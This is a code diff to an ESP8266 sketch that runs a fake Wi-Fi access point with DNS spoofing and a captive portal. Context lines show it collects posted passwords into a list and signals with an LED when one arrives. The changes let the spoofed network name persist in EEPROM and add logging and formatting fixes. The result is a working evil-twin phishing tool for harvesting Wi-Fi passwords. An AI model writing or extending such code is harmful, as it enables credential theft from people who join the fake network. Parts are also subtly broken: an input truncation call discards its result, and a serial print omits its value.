@@ -27,12 +27,13 @@ IPAddress APIP(172, 0, 0, 1); // Gateway
 
 String allPass = "";
 String newSSID = "";
+String currentSSID = "";
 
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
 
 String input(String argName) {
-  String a=webServer.arg(argName);
+  String a = webServer.arg(argName);
   a.replace("<","&lt;");a.replace(">","&gt;");
   a.substring(0,200); return a; }
 
@@ -41,7 +42,7 @@ String footer() {
 }
 
 String header(String t) {
-  String a = String(SSID_NAME);
+  String a = String(currentSSID);
   String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
     "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
     "div { padding: 0.5em; }"
@@ -54,7 +55,8 @@ String header(String t) {
   String h = "<!DOCTYPE html><html>"
     "<head><title>" + a + " :: " + t + "</title>"
     "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-    "<style>" + CSS + "</style></head>"
+    "<style>" + CSS + "</style>"
+    "<meta charset=\"UTF-8\"></head>"
     "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
   return h; }
 
@@ -73,21 +75,22 @@ String pass() {
 }
 
 String ssid() {
-  return header(TITLE) + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
-    "<input type=text name=s></input><input type=submit value=Change SSID></form>" + footer();
+  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>"+
+    "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
 }
 
 String postedSSID() {
   String postedSSID = input("s"); newSSID="<li><b>" + postedSSID + "</b></li>";
-  for (int i = 0; i < postedSSID.length(); ++i)
-  {
+  for (int i = 0; i < postedSSID.length(); ++i) {
     EEPROM.write(i, postedSSID[i]);
   }
+  EEPROM.write(postedSSID.length(), '\0');
+  EEPROM.commit();
   WiFi.softAP(postedSSID);
 }
 
 String clear() {
-  String pass=""; allPass = "";
+  String pass = ""; allPass = "";
   return header(CLEAR_TITLE) + "<div><p>The password list has been reseted.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
 
@@ -103,26 +106,32 @@ void BLINK() { // The built-in LED will blink 5 times after a password is posted
 }
 
 void setup() {
+  // Serial begin
+  Serial.begin(115200);
+  
   bootTime = lastActivity = millis();
   EEPROM.begin(512);
   delay(10);
   
   // Read EEPROM SSID
   String ESSID;
-  for (int i = 0; i < 32; ++i)
-  {
+  int i = 0;
+  while (EEPROM.read(i) != '\0') {
     ESSID += char(EEPROM.read(i));
+    i++;
   }
   
   WiFi.mode(WIFI_AP);
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
 
   // Check if EEPROM SSID is empty
-  if (ESSID == "") {
-    WiFi.softAP(SSID_NAME);
+  if ( ESSID.length() > 1 ) {
+    currentSSID = ESSID.c_str(); // Else, use the EEPROM SSID
   } else {
-    WiFi.softAP(ESSID); // If it's empty, use the default SSID
+    currentSSID = SSID_NAME; // If it's empty, use the default SSID
   }
+  Serial.print("SSID: ");
+  WiFi.softAP(currentSSID);  
 
   // Start webserver
   dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
@@ -141,5 +150,5 @@ void setup() {
 
 
 void loop() { 
-  if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
+  if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();} 
 dnsServer.processNextRequest(); webServer.handleClient(); }
